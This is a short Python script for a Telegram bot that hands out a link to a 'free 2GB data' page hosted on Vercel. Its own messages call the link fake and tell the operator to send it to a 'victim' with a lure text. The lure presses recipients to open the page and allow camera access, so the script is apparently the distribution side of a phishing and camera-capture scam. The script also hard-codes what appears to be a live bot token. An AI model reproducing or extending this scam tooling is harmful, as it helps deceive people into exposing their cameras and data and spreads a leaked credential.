import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8648939100:AAFGX-0YF9xtci8cR4f9QBK0HlvaM42_U9s"
ADMIN_ID = 7687952229

# YAHAN APNA VERCEL URL DAAL
VERCEL_URL = "https://freedata-2gb-claim-bot.vercel.app"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🔥 *Free 2GB Data Hack Active!*\n\n"
        f"📱 *Fake Link:* `{VERCEL_URL}`\n\n"
        f"👥 *Victim ko bhejo:*\n"
        f"\"Yeh lo free 2GB data ka link, jaldi claim karo!\"\n\n"
        f"📹 *Camera allow hoga tabhi milega 2bg free no loan only free!*",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🎁 *FREE 2GB DATA LINK:*\n\n"
        f"🔗 `{VERCEL_URL}`\n\n"
        f"📱 *Browser me kholo*\n"
        f"📸 *Camera allow karo*\n"
        f"✅ *2GB data milega!*\n\n"
        f"🤝 *Jaldi karo, limited offer hai!*",
        parse_mode='Markdown'
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
    
    print(f"🤖 Bot Ready! Link: {VERCEL_URL}")
    print("📱 Kisiko bhi ye link bhej do!")
    app.run_polling()

if __name__ == '__main__':
    main()